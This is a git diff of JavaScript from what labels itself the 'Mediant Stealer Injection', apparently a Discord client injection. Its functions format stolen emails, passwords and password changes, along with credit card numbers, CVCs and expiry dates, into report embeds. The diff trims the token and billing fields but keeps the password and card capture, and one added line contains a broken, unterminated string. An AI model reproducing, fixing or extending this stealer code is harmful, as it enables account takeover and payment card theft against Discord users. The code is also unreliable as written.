@@ -661,23 +661,13 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
+            value: `Email: **${email}** \n Password: **${password}**`,
             inline: false,
           },
         ],
         author: {
-          name: `Mediant Injection Info,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: 'Mediant Injection Info',
+          icon_url: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg',
         },
         footer: {
           text: '🎉・Mediant Stealer Injection',
@@ -705,21 +695,11 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             name: '**Password Changed**',
             value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
             inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
+          }
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: 'Mediant Injection Info',
+          icon_url: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg',
         },
         footer: {
           text: '🎉・Mediant Stealer Injection',
@@ -747,21 +727,11 @@ const emailChanged = async (email, password, token) => {
             name: '**Email Changed**',
             value: `New Email: **${email}**\nPassword: **${password}**`,
             inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
+          }
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          name: 'Mediant Injection Info,
+          icon_url: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg',
         },
         footer: {
           text: '🎉・Mediant Stealer Injection',
@@ -831,17 +801,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
             name: '**Credit Card Added**',
             value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
+          }
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
